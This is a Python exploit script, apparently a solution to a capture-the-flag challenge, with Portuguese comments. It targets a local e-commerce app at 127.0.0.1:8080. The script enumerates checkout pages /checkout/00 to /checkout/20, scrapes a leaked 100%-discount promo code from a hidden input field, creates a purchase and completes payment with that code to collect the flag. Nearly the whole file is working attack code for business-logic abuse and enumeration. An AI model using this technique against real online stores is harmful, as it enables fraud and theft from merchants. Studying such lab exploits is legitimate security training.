import requests
import json
from time import sleep
from bs4 import BeautifulSoup
import pyfiglet

url = 'http://127.0.0.1:8080'
cookie = {'user_id':'ac461772-3ce3-4d64-9622-2fb9177e2980'}
header = {'Content-Type':'application/json'}

ascii_banner = pyfiglet.figlet_format("    0x7du1C3")
print('')
print(ascii_banner)

def get_code():
    '''
    Analisando paginas em busca do código promocional
    '''
    print('[+] Buscando código promocional - Quer camisas de graça?')
    sequencia = [f"{i:02}" for i in range(0,21)]
    for i in sequencia:
        r = requests.get(url+'/checkout/'+i)

            #print(f'Testando /checkout/{i}')
        if "_PROMO_TESTANDO_DESCONTO_100" in r.text:
            soup = BeautifulSoup(r.content, 'html.parser')
            input_element = soup.find('input', id='codigo_promocao')
            input_value = input_element['value']
            print(f'[+] Código Promocional encontrado em http://127.0.0.1:8080/checkout/{i}: {input_value}\n')
            
    return input_value

def get_id_check():
    '''
    ID de uma compra válida
    '''
    body = json.dumps({
        "produto_id":2
        })
    req = requests.post(url=url+'/checkout', data=body, headers=header, cookies=cookie)
    print('[+] Adicionando ao carrinho')
    res = req.json()
    id_res = res['id']
    print(f'[+] ID de compra válido: {id_res}')
    #sleep(3)
    
    return str(id_res)

def get_flag(id, codigo):
    '''
    Finalizando a compra com código de promoção vazado
    '''
    body = json.dumps({
        "checkout_id":id, 
        "forma_pagamento":"pix", 
        "codigo_promocao":codigo
        })

    req = requests.post(url=url+'/checkout/payment', data=body, headers=header, cookies=cookie)
    print('\n[+] Finalizando a compra')
    sleep(3)
    response = print(req.text)

    return response

try:
    codigo = get_code()
    id = get_id_check()
    get_flag(id, codigo)
except:
    print(f"[x] Verifique se aplicação está ativa em {url}")
